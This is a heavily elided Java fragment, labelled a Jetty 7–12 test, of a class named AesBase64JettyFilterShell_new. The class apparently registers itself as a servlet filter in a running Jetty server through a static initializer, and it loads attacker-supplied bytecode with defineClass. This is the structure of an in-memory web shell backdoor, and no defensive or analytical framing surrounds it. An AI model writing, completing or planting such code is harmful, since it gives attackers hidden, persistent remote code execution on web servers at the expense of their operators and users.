...
//jetty7-12 test
public class AesBase64JettyFilterShell_new extends ClassLoader implements InvocationHandler {
    ...
    static {
        new AesBase64JettyFilterShell_new().addFilter();
    }

    public AesBase64JettyFilterShell_new(ClassLoader loader) {
        super(loader);
    }

    public AesBase64JettyFilterShell_new() {
                    ...
                    if (value != null) {
                        ...
                        if (data != null && data.length > 0) {
                            if (payloadClass == null) {
                                ...
                                payloadClass = new AesBase64JettyFilterShell_new(loader).defineClass(data, 0, data.length);
                            } else {
